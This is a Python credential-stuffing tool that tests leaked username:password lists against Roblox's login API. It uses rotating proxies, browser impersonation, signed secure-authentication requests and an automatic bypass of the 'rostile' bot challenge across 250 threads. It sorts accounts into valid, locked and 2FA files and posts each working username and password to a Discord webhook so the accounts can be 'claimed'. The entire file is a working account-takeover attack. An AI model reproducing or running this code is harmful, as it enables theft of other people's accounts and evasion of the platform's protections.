from curl_cffi import requests
import base64
import json
import os
import random
import time
import threading
import concurrent.futures
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style
from discord_webhook import DiscordWebhook, DiscordEmbed

colorama.init(autoreset=True)

class V3:
    def __init__(self, webhook_url=None):
        self.lock = threading.Lock()
        self.webhook_url = webhook_url

        if not os.path.exists("results"):
            os.makedirs("results")

    def savef(self, filename, content):
        filepath = os.path.join("results", filename)
        with self.lock:
            with open(filepath, "a") as f:
                f.write(content + "\n")

    # its ass idc
    def swh(self, username, password, avatar):
        if self.webhook_url:
            while True:
                try:
                    avatar_response = requests.get(avatar)
                    if avatar_response.status_code != 200:
                        print(f"{Fore.RED}[ FAILED TO GET AVATAR URLLL ] {username}: {avatar}")
                        return

                    webhook = DiscordWebhook(url=self.webhook_url)
                    embed = DiscordEmbed(title='**NEW HIT!**', description='Claim Before It Gets claimed', color='03b2f8')
                    embed.add_embed_field(name='Username', value=username, inline=True)
                    embed.add_embed_field(name='Password', value=password, inline=True)
                    embed.set_timestamp()
                    embed.set_footer(text='©Sentient - 2024')
                    embed.set_thumbnail(url=avatar)

                    webhook.add_embed(embed)
                    webhook.execute()
                    break

                except Exception as e:
                    time.sleep(1)

    def load_proxies(self):
        urls = [
            "raw url vro",
        ]
        proxy_url = random.choice(urls)
        try:
            response = requests.get(proxy_url)
            return [proxy.strip() for proxy in response.text.splitlines() if proxy.strip()]
        except requests.RequestError as e:
            return []

    def lctnr(self, filename="combo.txt"):
        with open(filename, "r", encoding="utf-8") as file:
            credentials = [
                line.strip().split(":") 
                for line in file if len(line.strip().split(":")) == 2
            ]
        random.shuffle(credentials)
        return credentials

    def lecnbuas(self):
        existing_combos = set()
        for filename in os.listdir("results"):
            filepath = os.path.join("results", filename)
            with open(filepath, "r", encoding="utf-8") as result_file:
                existing_combos.update(line.strip() for line in result_file.readlines())
        return existing_combos

    def gen_key_pair(self):
        priv_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        return priv_key, priv_key.public_key()

    def get_spki(self, pub_key):
        spki_bytes = pub_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return base64.b64encode(spki_bytes).decode('utf-8')

    def sign_data(self, priv_key, data):
        signature = priv_key.sign(data, ec.ECDSA(hashes.SHA256()))
        return base64.b64encode(signature).decode('utf-8')

    def get_csrf_token(self, session):
        headers_csrf = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        }
        response = session.get("https://www.roblox.com/", headers=headers_csrf)
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf_meta = soup.find('meta', attrs={'name': 'csrf-token'})
        return csrf_meta['data-token'] if csrf_meta else None

    def solve_rostile_challenge(self, session, headers_login, challenge_metadata_b64, login_payload):
        challenge_metadata_decoded = base64.b64decode(challenge_metadata_b64).decode('utf-8')
        challenge_metadata_json = json.loads(challenge_metadata_decoded)
        challenge_id = challenge_metadata_json.get("challengeId")

        payload = json.dumps({
            "challengeId": challenge_id,
            "solution": {"buttonClicked": True}
        })

        r = session.post("https://apis.roblox.com/rostile/v1/verify", headers=headers_login, data=payload)
        response_json = r.json()
        redemption_token = response_json.get('redemptionToken')

        continue_payload = json.dumps({
            "challengeId": challenge_id,
            "challengeType": "rostile",
            "challengeMetadata": json.dumps({"redemptionToken": redemption_token})
        })

        session.post("https://apis.roblox.com/challenge/v1/continue", headers=headers_login, data=continue_payload)

        headers_login['rblx-challenge-metadata'] = base64.b64encode(
            json.dumps({"redemptionToken": redemption_token}, separators=(',', ':')).encode('utf-8')
        ).decode('utf-8')
        headers_login['rblx-challenge-type'] = 'rostile'
        headers_login['rblx-challenge-id'] = challenge_id

        return session.post("https://auth.roblox.com/v2/login", headers=headers_login, json=login_payload)

    def loginy(self, username, password, session, csrf_token, servernonce, priv_key, pub_key):
        client_pub_key = self.get_spki(pub_key)
        data = f"{client_pub_key}{servernonce}".encode()
        sai_signature = self.sign_data(priv_key, data)

        login_url = "https://auth.roblox.com/v2/login"
        headers_login = {
            "Content-Type": "application/json;charset=UTF-8",
            "X-Csrf-Token": csrf_token,
        }

        login_payload = {
            "ctype": "Username",
            "cvalue": username,
            "password": password,
            "secureAuthenticationIntent": {
                "clientPublicKey": client_pub_key,
                "serverNonce": servernonce,
                "saiSignature": sai_signature
            }
        }

        response_login = session.post(login_url, headers=headers_login, json=login_payload)

        if 'rblx-challenge-type' in response_login.headers:
            challenge_type = response_login.headers['rblx-challenge-type']
            if challenge_type == 'rostile':
                print(f"{Fore.MAGENTA}[ ROSTILE ] {username}")
                challenge_metadata_b64 = response_login.headers.get('rblx-challenge-metadata')
                return self.solve_rostile_challenge(session, headers_login, challenge_metadata_b64, login_payload)

            elif challenge_type == 'captcha':
                
                pass

        return response_login

    def gava(self, user_id):
        while True:
            try:
                avatar_response = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=75x75&format=Png&isCircular=false")
                if avatar_response.status_code == 200:
                    return avatar_response.json()["data"][0]["imageUrl"]
                else:
                    time.sleep(1)
            except Exception as e:
                time.sleep(1)

    def worker(self, username, password, proxies, existing_combos):
        if f"{username}:{password}" in existing_combos:
            return

        for _ in range(5):
            proxy = random.choice(proxies)
            session = requests.Session(impersonate="chrome")
            session.proxies = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }

            try:
                csrf_token = self.get_csrf_token(session)
                if not csrf_token:
                    continue
                    
                # slowest shit on earth
                servernonce = session.get("https://apis.roblox.com/hba-service/v1/getServerNonce").text.strip('"')
                priv_key, pub_key = self.gen_key_pair()

                response = self.loginy(username, password, session, csrf_token, servernonce, priv_key, pub_key)

                # dogshit
                if "displayName" in response.text:
                    info = response.json()
                    user_id = info["user"]["id"]
                    avatar = self.gava(user_id)
                    print(f"{Fore.GREEN}[ SUCCESS ] {username}")
                    self.savef("valid.txt", f"{username}:{password}")
                    self.swh(username, password, avatar)
                    return

                elif "Incorrect username or password" in response.text:
                    print(f"{Fore.RED}[ INVALID ] {username}")
                    self.savef("invalid.txt", f"{username}:{password}")

                elif "Account has been locked" in response.text:
                    print(f"{Fore.YELLOW}[ LOCKED ] {username}")
                    self.savef("locked.txt", f"{username}:{password}")

                # flags shit
                elif "Security Question" in response.text or "twoStepVerificationData" in response.text:
                    print(f"{Fore.MAGENTA}[ 2FA ] {username}")
                    self.savef("2fa.txt", f"{username}:{password}")

            except requests.RequestError as e:
                continue

    def main(self, num_threads=250):
        credentials = self.lctnr()
        proxies = self.load_proxies()
        existing_combos = self.lecnbuas()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(self.worker, username, password, proxies, existing_combos) for username, password in credentials]

            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass

if __name__ == "__main__":
    webhook_url = "Webhook Goes Here"
    Sentient = V3(webhook_url)
    Sentient.main()
